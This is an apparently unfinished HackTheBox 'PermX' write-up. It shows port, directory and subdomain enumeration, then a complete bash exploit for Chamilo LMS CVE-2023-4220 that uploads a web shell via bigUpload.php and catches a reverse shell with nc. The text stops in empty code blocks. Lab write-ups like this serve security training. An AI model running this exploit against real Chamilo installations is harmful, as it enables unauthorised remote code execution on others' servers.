<pre><code>~> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.23 | tee nmap1.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-01 13:32 -03
Initiating SYN Stealth Scan at 13:32
Scanning 10.10.11.23 [65535 ports]
Discovered open port 80/tcp on 10.10.11.23
Discovered open port 22/tcp on 10.10.11.23
Completed SYN Stealth Scan at 13:32, 26.65s elapsed (65535 total ports)
Nmap scan report for 10.10.11.23
Host is up, received user-set (0.47s latency).
Scanned at 2024-10-01 13:32:14 -03 for 27s
Not shown: 58040 filtered tcp ports (no-response), 7493 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 127867 (5.626MB) | Rcvd: 7597 (303.908KB)</code></pre>

<pre><code>> sudo nmap -p80,22 -sCV -Pn 10.10.11.23 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-01 13:34 -03
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</code></pre>

<pre><code>~> sudo nano /etc/hosts</code></pre>

<pre><code>{ip} permx.htb</code></pre>


<pre><code>> gobuster dir -u http://permx.htb/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 | tee gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://permx.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]</code></pre>

<pre><code>> ffuf -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://permx.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 271ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 184ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 212ms]

</code></pre>

<pre><code>> ffuf -u http://permx.htb -H "host:FUZZ.permx.htb" -w /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 18 | tee ffuf-dns.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 3898ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 212ms]</code></pre>

<pre><code>sudo nano /etc/hosts
10.10.11.23 permx.htb www.permx.htb lms.permx.htb
</code></pre>

![2024-10-01_14-21](https://github.com/user-attachments/assets/9f1bebc6-50c1-44d8-9631-639956d8f2c1)

<pre><code>> sudo gobuster dir -u http://lms.permx.htb -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,js,json,cfg,xml,zip -t 200
[sudo] contraseña para maxi: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lms.permx.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,js,json,cfg,xml,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.php             (Status: 302) [Size: 0] [--> whoisonline.php]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/LICENSE              (Status: 200) [Size: 35147]
/index.php            (Status: 200) [Size: 19356]
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/terms.php            (Status: 200) [Size: 16127]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/.                    (Status: 200) [Size: 19348]
/license.txt          (Status: 200) [Size: 1614]
/robots.txt           (Status: 200) [Size: 748]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/news_list.php        (Status: 200) [Size: 13995]
</code></pre>

![2024-10-01_14-53](https://github.com/user-attachments/assets/d32eaa8a-4f90-488f-9f67-1d23d4fb0501)

![2024-10-01_14-55](https://github.com/user-attachments/assets/7fb6e6f1-46f8-42b5-8436-5e225217e988)

https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit


![2024-10-01_14-58](https://github.com/user-attachments/assets/c95e6536-8995-4008-9f97-3aef99a349b7)

<pre><code>
# Exploit Title : Chamilo LMS CVE-2023-4220 Exploit
# Date : 11/28/2023
# Exploit Author : Ziad Sakr (@Ziad-Sakr)
# Version : ≤v1.11.24
# CVE : 2023-4220
# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2023-4220
#
# Description :
#   This is an Exploit for Unrestricted file upload in big file upload functionality in Chamilo-LMS for this 
#   location "/main/inc/lib/javascript/bigupload/inc/bigUpload.php" in Chamilo LMS <= v1.11.24, and Attackers can 
#   obtain remote code execution via uploading of web shell.
#
# Usage:  ./CVE-2023-4220.sh -f reveres_file -h host_link -p port_in_the_reverse_file


#!/bin/bash

# Initialize variables with default values
reverse_file=""
host_link=""
port=""

#------------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# Usage function to display script usage
usage() {
    echo -e "${GREEN}"
    echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
    echo -e "${NC}"
    echo "Options:"
    echo "  -f    Path to the reverse file"
    echo "  -h    Host link where the file will be uploaded"
    echo "  -p    Port for the reverse shell"
    exit 1
}

# Parse command-line options
while getopts "f:h:p:" opt; do
    case $opt in
        f)
            reverse_file=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        \?)
            echo -e "${RED}"
            echo "Invalid option: -$OPTARG" >&2
            usage
            ;;
        :)
	    echo -e "${RED}"
            echo "Option -$OPTARG requires an argument." >&2
            usage
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
    echo -e  "${RED}"
    echo "All options -f, -h, and -p are required."
    usage
fi
# Perform the file upload using curl
echo -e "${GREEN}" 
curl -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
echo
echo
echo -e "#    Use This leter For Interactive TTY ;) " "${RED}"
echo "#    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "#    export TERM=xterm"
echo "#    CTRL + Z"
echo "#    stty raw -echo; fg"
echo -e "${GREEN}"
echo "# Starting Reverse Shell On Port $port . . . . . . ."
sleep 3
curl "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" &
echo -e  "${NC}"

nc -lnvp $port 
</code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
